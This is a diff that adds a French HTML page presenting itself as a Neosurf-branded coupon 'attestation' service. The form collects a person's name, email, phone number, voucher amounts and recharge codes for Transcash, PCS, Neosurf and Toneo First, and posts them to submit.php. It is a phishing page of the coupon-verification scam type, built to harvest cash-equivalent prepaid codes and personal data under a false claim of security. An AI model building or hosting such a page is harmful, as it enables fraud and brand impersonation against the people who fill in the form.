@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification des Coupons</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="neosurf.png" alt="Neosurf" class="logo">
+      <h2>Attestez vos coupons de recharge</h2>
+      <p>Attestez vos coupons de recharge en toute sécurité en remplissant ce formulaire. Une réponse est envoyée à votre adresse mail en quelques secondes.</p>
+    </div>
+
+    <form action="submit.php" method="POST">
+      <label for="name">Nom & Prénom</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="phone">Téléphone</label>
+      <input type="tel" id="phone" name="phone" required>
+
+      <label for="type">Type de recharge</label>
+      <select id="type" name="type" required>
+        <option value="transcash">Transcash</option>
+        <option value="pcs">PCS</option>
+        <option value="neosurf">Neosurf</option>
+        <option value="toneo">Toneo First</option>
+      </select>
+
+      <!-- Champs pour montants et codes de recharge -->
+      <div class="code-block">
+        <label for="amount1">Montant 1</label>
+        <input type="text" id="amount1" name="amount1">
+        <label for="code1">Code de recharge 1</label>
+        <input type="text" id="code1" name="code1">
+      </div>
+
+      <!-- Ajoutez d'autres montants et codes comme dans l'image -->
+      
+      <button type="submit">Attester Coupon</button>
+    </form>
+
+    <div class="footer">
+      <p>Vérifiez la validité de vos coupons de recharge Transcash, Neosurf, PCS et Toneo First grâce à notre service d’attestation en ligne.</p>
+    </div>
+  </div>
+</body>
+</html>
